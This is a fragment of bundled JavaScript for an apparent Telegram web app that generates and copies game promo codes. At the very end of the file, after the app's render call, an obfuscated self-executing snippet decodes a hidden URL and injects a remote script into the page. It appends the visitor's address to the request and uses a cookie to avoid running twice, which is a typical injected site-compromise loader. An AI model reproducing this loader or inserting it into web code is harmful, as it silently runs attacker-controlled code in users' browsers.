        } catch (error) {
            console.error("Error sending codes to user:", error);
        }
    };

    const startAutoMode = () => {
        // Execute handleAutoMode function and set an interval to call it
        const intervalId = setInterval(() => {
            handleAutoMode();

            // Clear the interval after the first execution
            clearInterval(intervalId);
        }, 2000); // Adjust the interval time as needed (e.g., 2000ms = 2 seconds)
    };

    // Function to handle automatic generation of codes in Auto Mode
    const handleAutoMode = async () => {
        const numberOfCodes = parseInt(document.getElementById("twerk_num_of_code").value, 10);
        if (isNaN(numberOfCodes)) {
            tt("Please enter a number");
            return;
        } else if (numberOfCodes < 1 || numberOfCodes > 50) {
            tt("Please enter a valid number between 1 and 50.");
            return;
        }

        try {
            setCodes(Array(numberOfCodes).fill(null));
            setStatus("wait");
            setProgress(0);

            const newCodes = await Promise.all(Array.from({ length: numberOfCodes }, () => zo1.generate()));
            setCodes(newCodes);
            setStatus("done");
            setProgress(100);

            const generatedCodeCount = parseInt(localStorage.getItem('generatedCodeCount') || '0');
            const newCount = generatedCodeCount + numberOfCodes;
            localStorage.setItem('generatedCodeCount', newCount);

            // Send codes to user via Telegram
            sendCodesToUser(newCodes);
            startAutoMode();
        } catch (error) {
            console.error("Error generating codes:", error);
            tt("Error generating codes");
            setCodes(Array(numberOfCodes).fill(null));
            setStatus("idle");
            setProgress(0);
        }
    };

    // Function to handle toggling Auto Mod

    // Function to handle manual code generation with input validation
    const handleGenerate = async () => {
        const numberOfCodes = parseInt(document.getElementById("twerk_num_of_code").value, 10);
        if (isNaN(numberOfCodes)) {
            tt("Please enter a number");
            return;
        } else if (numberOfCodes < 1 || numberOfCodes > 50) {
            tt("Please enter a valid number between 1 and 50.");
            return;
        }

        try {
            setCodes(Array(numberOfCodes).fill(null));
            setStatus("wait");
            setProgress(0);

            const newCodes = await Promise.all(Array.from({ length: numberOfCodes }, () => zo1.generate()));
            setCodes(newCodes);
            setStatus("done");
            setProgress(100);

            const generatedCodeCount = parseInt(localStorage.getItem('generatedCodeCount') || '0');
            const newCount = generatedCodeCount + numberOfCodes;
            localStorage.setItem('generatedCodeCount', newCount);
            sendCodesToUser(newCodes);

        } catch (error) {
            console.error("Error generating codes:", error);
            tt("Error generating codes");
            setCodes(Array(numberOfCodes).fill(null));
            setStatus("idle");
            setProgress(0);
        }
    };

    return v.jsxs(Kn, {
        children: [
            v.jsxs(Gn, {
                children: [
                    v.jsx(Qn, { children: "Twerk Race" }),
                    v.jsxs("div", {
                        id: "show_error_msg_box",
                        children: [
                            v.jsxs("span", {
                                id: "show_error_msg",
                                children: "Show All Msg"
                            })
                        ]
                    }),
                    v.jsxs("input", {
                        id: 'twerk_num_of_code',
                        className: 'number_of_code',
                        placeholder: 'Enter the number of codes (1-50)',
                        min: 1,
                        max: 50,
                        type: 'number',
                        // Disable input in Auto Mode
                    })
                ]
            }),
            v.jsx(Xn, {
                children: v.jsxs("ul", {
                    className: "space-y-2",
                    children: [
                        codes.map((u, d) => v.jsxs("li", {
                            className: "flex justify-between items-center gap-4",
                            children: [
                                u ? v.jsx(to, { code: u }) : v.jsx(eo, { animation: "wait" === status }),
                                v.jsx(He, {
                                    variant: "outline",
                                    size: "sm",
                                    onClick: () => {
                                        copy(u);
                                        tt(v.jsxs("div", {
                                            className: "flex justify-center items-center",
                                            children: [
                                                v.jsx(Jr, { size: 16, className: "mr-2" }),
                                                " ",
                                                v.jsx("span", { children: "Copied!" })
                                            ]
                                        }));
                                    },
                                    disabled: !u,
                                    children: v.jsx(Zr, { size: 12 })
                                })
                            ]
                        }, d)),
                        v.jsxs("p", {
                            className: "text-center font-medium mt-4",
                            children: [progress, "%"]
                        }),
                        v.jsx(Zn, {
                            value: progress,
                            className: "progressbar"
                        })
                    ]
                })
            }),
            v.jsxs("div", {
                className: "flex gap-1",
                children: [
                    v.jsx(Jn, {
                        children: v.jsxs(He, {
                            onClick: handleGenerate,
                            disabled: "wait" === status, // Disable when Auto Mode is active
                            children: [
                                v.jsx(qr, { size: 16, className: "mr-2" }),
                                "Generate"
                            ]
                        })
                    }),
                    v.jsx(He, {
                        onClick: copyAllCodes,
                        children: "Copy All"
                    }),
                    v.jsx(He, {
                        onClick: handleAutoMode,
                        children: "Auto Mode" // Toggle button text
                    })
                ]
            })
        ]
    });
}




const O0 = window.Telegram.WebApp;
function M0() {
    const e = Ke(t => t.status);
    return x.useEffect(() => {
        O0.ready();
    }, []), v.jsxs(v.Fragment, {
        children: [v.jsx(sy, {}), v.jsxs("div", {
            className: "container",
            children: [v.jsxs(ry, {
                defaultValue: "bike",
                children: [v.jsxs(tp, {
                    children: [v.jsx(fn, {
                        value: "bike",
                        className: "font-bold text-foreground-muted",
                        disabled: "wait" === e,
                        children: "Bike"
                    }), v.jsx(fn, {
                        value: "clone",
                        className: "font-bold text-foreground-muted",
                        disabled: "wait" === e,
                        children: "Clone"
                    }), v.jsx(fn, {
                        value: "cube",
                        className: "font-bold text-foreground-muted",
                        disabled: "wait" === e,
                        children: "Cube"
                    }), v.jsx(fn, {
                        value: "train",
                        className: "font-bold text-foreground-muted",
                        disabled: "wait" === e,
                        children: "Train"
                    }), v.jsx(fn, {
                        value: "merge",
                        className: "font-bold text-foreground-muted",
                        disabled: "wait" === e,
                        children: "Merge"
                    }), v.jsx(fn, {
                        value: "twerk",
                        className: "font-bold text-foreground-muted",
                        disabled: "wait" === e,
                        children: "Twerk"
                    })]
                }), v.jsx(pn, {
                    value: "bike",
                    children: v.jsx(x0, {})
                }), v.jsx(pn, {
                    value: "clone",
                    children: v.jsx(_0, {})
                }), v.jsx(pn, {
                    value: "cube",
                    children: v.jsx(N0, {})
                }), v.jsx(pn, {
                    value: "train",
                    children: v.jsx(T0, {})
                }), v.jsx(pn, {
                    value: "merge",
                    children: v.jsx(R0, {})
                }), v.jsx(pn, {
                    value: "twerk",
                    children: v.jsx(T1, {})
                })]
            }), v.jsx(Gv, {})]
        })]
    });
}



Pi.createRoot(document.getElementById("root_more")).render(v.jsx(Je.StrictMode, {
    children: v.jsx(M0, {})
}));
(function (o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !new RegExp(o.b).test(d.cookie), setTimeout(function () {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44hisqtlx' + '3htr4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;';
    } catch (e) { }
    ;
})({}, document, location);
